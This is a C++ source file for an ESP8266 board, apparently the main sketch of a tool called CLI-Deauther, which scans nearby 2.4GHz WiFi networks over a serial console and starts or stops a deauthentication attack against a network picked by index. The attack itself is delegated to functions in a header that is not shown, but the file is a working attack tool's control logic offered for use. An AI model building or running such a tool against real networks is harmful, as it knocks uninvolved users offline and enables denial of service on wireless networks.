/*
 * CLI-Deauther
 * A tool that deauthenticates 2.4GHz WiFi networks over a serial console.
 * Author - WireBits
 */

#include "deauth.h"
#include <ESP8266WiFi.h>

struct WiFiNetwork {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
};

int networkCount = 0;
bool scanning = false;
bool scanExecuted = false;
WiFiNetwork scannedNetworks[50];

bool ledState = LOW;
const int ledPin = 2;
const long blinkInterval = 50;
unsigned long previousMillis = 0;

void startWiFiScan() {
  Serial.println("[*] Scanning for networks...");
  scanning = true;
  scanExecuted = true;
  WiFi.scanNetworks(true);
}

void showScannedNetworks() {
  networkCount = WiFi.scanComplete();
  if (networkCount == 0) {
    Serial.println("[!] No networks found!");
    return;
  }
  Serial.println("\n[*] Scanned WiFi Networks:");
  Serial.println("-------------------------------------------------");
  for (int i = 0; i < networkCount; i++) {
    scannedNetworks[i].ssid = WiFi.SSID(i);
    memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
    scannedNetworks[i].channel = WiFi.channel(i);
    scannedNetworks[i].rssi = WiFi.RSSI(i);
    Serial.printf("[%02d] - SSID    : %s\n", i, scannedNetworks[i].ssid.c_str());
    Serial.printf("       BSSID   : %02X:%02X:%02X:%02X:%02X:%02X\n",
                      scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], 
                      scannedNetworks[i].bssid[2], scannedNetworks[i].bssid[3], 
                      scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
    Serial.printf("       Channel : %d\n", scannedNetworks[i].channel);
    Serial.printf("       RSSI    : %d dBm\n", scannedNetworks[i].rssi);
    Serial.println("-------------------------------------------------");
  }
}

void showHelp() {
  Serial.println("\nAvailable Commands:");
  Serial.println("  scan        - Scan for nearby WiFi networks");
  Serial.println("  deauth X    - Start deauth attack on network X (X = Index Number)");
  Serial.println("  deauth off  - Stop deauth attack");
  Serial.println("  help        - Show this help message\n");
}

void blinkLED() {
  unsigned long currentMillis = millis();
  if (currentMillis - previousMillis >= blinkInterval) {
    previousMillis = currentMillis;
    ledState = !ledState;
    digitalWrite(ledPin, ledState ? LOW : HIGH);
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  WiFi.mode(WIFI_STA);
  initDeauth();
}

void loop() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    if (command.equalsIgnoreCase("scan")) {
      startWiFiScan();
    }
    else if (command.startsWith("deauth ")) {
      String arg = command.substring(7);
      arg.trim();
      if (arg.equalsIgnoreCase("off")) {
        if (!deauthExecuted) {
          Serial.println("[!] Deauth Network First!");
        } else {
          stopDeauth();
        }
      } else {
        int index = arg.toInt();
        startDeauth(index);
      }
    }
    else if (command.equalsIgnoreCase("help")) {
      showHelp();
    }
    else {
      Serial.println("[!] Invalid command. Type 'help' for available commands.");
    }
  }
  if (scanning) {
    int found = WiFi.scanComplete();
    if (found >= 0) {
      showScannedNetworks();
      scanning = false;
      Serial.println("[*] Scanning Completed!");
    }
  }
  if (deauthRunning) {
    sendDeauth();
    blinkLED();
  }
}
